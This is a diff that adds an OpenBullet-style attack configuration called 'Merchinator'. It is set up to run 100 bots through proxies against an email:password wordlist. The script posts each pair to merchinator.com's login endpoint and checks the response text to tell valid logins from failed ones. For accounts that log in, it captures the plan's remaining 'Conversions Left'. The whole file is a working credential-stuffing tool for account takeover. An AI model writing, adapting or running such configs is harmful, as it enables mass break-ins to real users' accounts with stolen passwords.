@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "Merchinator",
+  "SuggestedBots": 100,
+  "LastModified": "2018-07-04T17:14:44.8824284+00:00",
+  "AdditionalInfo": "",
+  "Author": "MsDemeanor",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#DASHBOARD_REQUEST REQUEST POST "https://merchinator.com/dashboard/etc/login.php" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://merchinator.com/dashboard/login" 
+  HEADER "Origin: https://merchinator.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Password is wrong" 
+    KEY "User doesn't exist" 
+  KEYCHAIN Success OR 
+    KEY "Logging In" 
+REQUEST GET "https://merchinator.com/dashboard/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://merchinator.com/dashboard/login" 
+PARSE "<SOURCE>" LR "=\"menuItemTextAltWithDate\">" "Conversions Left<br><span class=\"subText upgradePlan " Recursive=FALSE -> CAP "Coversions Left" "" "" 
